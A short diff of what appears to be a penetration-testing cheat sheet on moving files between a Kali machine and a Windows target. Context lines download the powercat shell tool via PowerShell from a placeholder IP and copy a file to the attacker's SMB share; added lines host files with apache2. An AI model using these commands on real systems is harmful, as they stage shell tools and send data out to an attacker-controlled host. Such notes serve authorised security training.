@@ -37,3 +37,10 @@ $WebClient.DownloadFile("https://ip/powercat.ps1","C:\path\powercat.ps1")
 2. `net use \\kali-ip\share /u:username password` - use share on windows machine - this allows the windows machine to interact with the share on the kali box
 
 3. `copy file.txt \\kali-ip\share\file.txt` - send file to kali smb share from windows poweshell/cmd
+
+##### host apache2 webserver
+
+`sudo systemctl start apache2` - start apache webserver
+
+`sudo cp /file/to/share /var/www/html/` - host the file
+
